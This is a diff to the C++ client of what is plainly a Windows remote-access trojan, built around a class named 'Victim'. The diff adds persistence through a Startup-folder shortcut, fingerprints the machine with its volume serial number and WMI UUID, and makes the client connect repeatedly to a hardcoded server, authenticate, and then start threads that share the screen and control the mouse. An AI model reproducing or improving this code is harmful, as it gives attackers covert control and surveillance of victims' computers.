@@ -1,40 +1,30 @@
 #include "victim.h"
 
+#include <comdef.h>
+#include <Wbemidl.h>
+#pragma comment(lib, "wbemuuid.lib")
+
 Victim::Victim()
 {    
+    hardwareId = getHardwareId();
+
     //release all keys
     for (int i = 0; i < 256; i++)
         keysStates[i] = false;
 
     wchar_t buf[256];
-    int bytes = GetModuleFileNameW(NULL, buf, sizeof(buf));
+    GetModuleFileNameW(NULL, buf, sizeof(buf));
     std::wstring path(buf);
-    std::string tempPath = "";
-    for (auto c : path)
-        tempPath += char(c);
-    exePath = tempPath.substr(0, tempPath.find_last_of('\\'));
-    std::string exeName = tempPath.substr(tempPath.find_last_of('\\') + 1);
+    std::wstring exeName = path.substr(path.find_last_of('\\') + 1);
 
-    //if needed create the context file
-    std::ofstream createFile(exePath + "\\vcontext.txt", std::ios::app);
-    createFile.close();
-    //read the context file
-    std::ifstream readFile(exePath + "\\vcontext.txt");
-    getline(readFile, name);
-
-    //remove spaces before and after name
-    while (name.size() > 0 && name[0] == ' ')
-        name.erase(name.begin());
-    while (name.size() > 0 && name[name.size() - 1] == ' ')
-        name.erase(name.begin() + name.size() - 1);
-    readFile.close();
-
+    //add app to autostart
     PWSTR start;
     if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start))) {
-        std::wstring lnkPath = std::wstring(start) + L"\\" + std::wstring(exeName.begin(), exeName.end()) + L".lnk";
+        std::wstring lnkPath = std::wstring(start) + L"\\" + exeName + L".lnk";
         //free the allocated memory
         CoTaskMemFree(start);
 
+        //create the link
         if (SUCCEEDED(CoInitialize(NULL))) {
             IShellLink* pShellLink = NULL;
             if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink))) {
@@ -157,14 +147,6 @@ int Victim::controlVictim()
                 controlMouse = true;
             else
                 controlMouse = false;
-        }
-        //rename client
-        else if (cmd == 'w') {
-            p >> name;
-            //write the new name in the context file
-            std::ofstream file(exePath + "\\vcontext.txt", std::ios::trunc);
-            file.write(name.c_str(), name.size());
-            file.close();
         }
         //apparently victim isn't initialized
         else if (cmd == '?') {
@@ -313,33 +295,47 @@ void Victim::connectServer()
 {
 connect:
     //connect to server
-    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
+    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done)
+        sf::sleep(sf::seconds(5));
+
     std::cout << "connected with server\n";
 
 init:
     sf::Packet p;
-    p << sf::Uint8(VICTIM_VERSION) << name;
-    //tell server the role and the name
-    if (server.send(p) == sf::Socket::Disconnected)
-        goto connect;
+    //tell server the role and the hardware id
+    p << sf::Uint8('v') << VICTIM_PASS << hardwareId;
+    server.send(p);
 
     p.clear();
     if (server.receive(p) == sf::Socket::Disconnected)
         goto connect;
 
-    sf::Uint8 version = 0;
-    p >> version;
-    if (version != VICTIM_VERSION)
+    sf::Uint8 role;
+    p >> role;
+    //connection approved
+    if (role == sf::Uint8('v')) {
+        std::cout << "connection with server approved\n";
+        isConnected = true;
+
+        std::thread pinMouseTh(&Victim::pinMouse, this);
+        pinMouseTh.detach();
+
+        std::thread shareScreemTh(&Victim::shareScreen, this);
+        shareScreemTh.detach();
+    }
+    //this is an old version
+    else if (role == sf::Uint8('<')) {
+        std::cout << "server rejected the connection because of version mis-match";
+        while (true)
+            Mlib::sleep(Mlib::seconds(10));
+    }
+    //unknown error (try endlessly)
+    else {
+        std::cout << "server rejected the connection for unknown reasons\n";
+        Mlib::sleep(Mlib::seconds(5));
         goto init;
+    }
 
-    std::cout << "connection with server approved\n";
-    isConnected = true;
-
-    std::thread pinMouseTh(&Victim::pinMouse, this);
-    pinMouseTh.detach();
-
-    std::thread shareScreemTh(&Victim::shareScreen, this);
-    shareScreemTh.detach();
 }
 void Victim::createNewFile()
 {
@@ -451,4 +447,106 @@ void Victim::shareScreen()
 
     DeleteDC(hMemoryDC);
     ReleaseDC(NULL, hScreenDC);
+}
+
+std::string Victim::getHardwareId()
+{
+    std::string hardwareIdString = "";
+
+    DWORD volumeSerialNumber = 0;
+    BOOL result = GetVolumeInformationA("C:\\", 0, 0, &volumeSerialNumber, 0, 0, 0, 0);
+    if (result) {
+        char serialNumber[9];
+        sprintf_s(serialNumber, "%08X", volumeSerialNumber);
+
+        for (int i = 0; i < 8; i++)
+            hardwareIdString += serialNumber[i];
+    }
+    else {
+        std::cout << "failed to retrieve volume serial number, error: " << GetLastError();
+    }
+
+    HRESULT hres;
+
+    //initialize COM
+    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
+    if (FAILED(hres)) {
+        std::cout << "Failed to initialize COM library. Error code = 0x" << std::hex << hres;
+    }
+
+    //set general COM security levels
+    hres = CoInitializeSecurity(0, -1, 0, 0, RPC_C_AUTHN_LEVEL_DEFAULT,
+        RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_NONE, 0);
+    if (FAILED(hres)) {
+        std::cout << "Failed to initialize security. Error code = 0x" << std::hex << hres;
+        CoUninitialize();
+    }
+
+    //obtain the initial locator to WMI
+    IWbemLocator* pLoc = NULL;
+    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
+        IID_IWbemLocator, (LPVOID*)&pLoc);
+    if (FAILED(hres)) {
+        std::cout << "Failed to create IWbemLocator object. Error code = 0x" << std::hex << hres;
+        CoUninitialize();
+    }
+
+    //connect to WMI through the IWbemLocator::ConnectServer method
+    IWbemServices* pSvc = NULL;
+    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), 0, 0, 0, 0, 0, 0, &pSvc);
+    if (FAILED(hres)) {
+        std::cout << "Could not connect. Error code = 0x" << std::hex << hres;
+        pLoc->Release();
+        CoUninitialize();
+    }
+
+    //set security levels on the proxy
+    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, 0,
+        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_NONE);
+    if (FAILED(hres)) {
+        std::cout << "Could not set proxy blanket. Error code = 0x" << std::hex << hres;
+        pSvc->Release();
+        pLoc->Release();
+        CoUninitialize();
+    }
+
+    //use the IWbemServices pointer to make requests of WMI
+    IEnumWbemClassObject* pEnumerator = NULL;
+    hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT UUID FROM Win32_ComputerSystemProduct"),
+        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, 0, &pEnumerator);
+    if (FAILED(hres)) {
+        std::cout << "Query for UUID failed. Error code = 0x" << std::hex << hres;
+        pSvc->Release();
+        pLoc->Release();
+        CoUninitialize();
+    }
+
+    //get the data from the query
+    IWbemClassObject* pclsObj = NULL;
+    ULONG uReturn = 0;
+    while (pEnumerator) {
+        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+        if (uReturn == 0)
+            break;
+
+        //get the value of the UUID property
+        VARIANT vtProp;
+        VariantInit(&vtProp);
+        hr = pclsObj->Get(L"UUID", 0, &vtProp, 0, 0);
+        std::wstring ws(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
+        std::string uuid(ws.begin(), ws.end());
+
+        VariantClear(&vtProp);
+        pclsObj->Release();
+
+        uuid.erase(std::remove(uuid.begin(), uuid.end(), '-'), uuid.end());
+        hardwareIdString += uuid;
+    }
+
+    pSvc->Release();
+    pLoc->Release();
+    pEnumerator->Release();
+    CoUninitialize();
+
+    return hardwareIdString;
 }
